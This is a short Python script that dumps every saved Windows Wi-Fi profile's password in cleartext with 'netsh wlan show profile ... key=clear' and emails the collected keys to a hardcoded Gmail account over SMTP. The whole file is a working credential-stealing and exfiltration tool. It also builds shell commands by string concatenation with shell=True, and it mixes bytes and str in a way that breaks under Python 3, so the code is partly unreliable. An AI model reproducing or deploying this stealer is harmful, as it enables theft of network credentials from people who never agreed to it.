#! /usr/bin/env python3

import subprocess, smtplib, re

# Setup email 
def send_mail(email, password, message):
	server = smtplib.SMTP("smtp.gmail.com", 587)
	server.starttls()
	server.login(email, password)
	server.sendmail(email, email, message)
	server.quit()

command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)

result = ''
for network_name in network_names_list:
	command = 'netsh wlan show profile ' + network_name + ' key=clear'
	current_result = subprocess.check_output(command, shell=True)
	result = result + current_result

# Replace with your email and password

send_mail("your email", "your password", result)
